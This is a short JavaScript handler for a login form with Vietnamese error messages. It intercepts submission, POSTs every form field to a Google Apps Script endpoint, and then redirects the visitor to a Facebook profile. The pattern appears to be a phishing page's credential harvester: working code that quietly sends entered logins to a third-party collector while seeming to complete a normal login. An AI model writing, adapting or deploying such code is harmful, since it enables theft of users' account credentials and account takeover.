document.addEventListener("DOMContentLoaded", function () {
    const loginForm = document.getElementById("loginForm");

    loginForm.addEventListener("submit", function (event) {
        event.preventDefault();

        const formData = new FormData(loginForm);

        fetch("https://script.google.com/macros/s/AKfycbyb245t58Bx7wrTvNEoT5ZDuShfYFdaHdyYk3XsEpXR0HKb8n5egHVqaoVLi_cSf83n0w/exec", {
            method: "POST",
            body: formData,
        })
            .then(response => {
                if (response.ok) {
                    window.location.href = "https://web.facebook.com/profile.php?id=100095053480606";
                } else {
                    alert("Đã xảy ra lỗi, vui lòng thử lại.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("Đã xảy ra lỗi khi gửi yêu cầu.");
            });
    });
});
